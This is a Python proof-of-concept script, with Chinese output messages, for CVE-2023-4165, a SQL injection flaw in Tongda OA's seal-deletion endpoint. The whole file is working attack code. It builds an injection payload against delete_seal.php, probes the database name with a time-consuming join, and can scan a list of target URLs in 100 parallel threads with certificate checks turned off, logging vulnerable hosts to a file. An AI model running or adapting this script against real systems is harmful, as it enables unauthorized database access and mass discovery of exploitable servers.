# 通达OA_sql注入漏洞POC(CVE-2023-4165)
import requests, argparse, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = '''  
                                   author:MOYV  
'''
    print(banner)

def poc(target):
    api_payload = "/general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1"
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/116.0Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zhHK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip,deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }
    try:
        res = requests.get(url=target + api_payload, verify=False, headers=headers, timeout=10)
        if res.status_code == 200 and '/static/js/ba/' in res.text:
            print(f"[+]{target}存在SQL注入")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f"{target}存在SQL注入\n")
        else:
            print(f"[-]{target}不存在SQL注入")
    except:
        print(f"[!]{target}可能存在问题，请手动检测")

def main():
    banner()
    parse = argparse.ArgumentParser(description="通达OA_sql注入漏洞脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()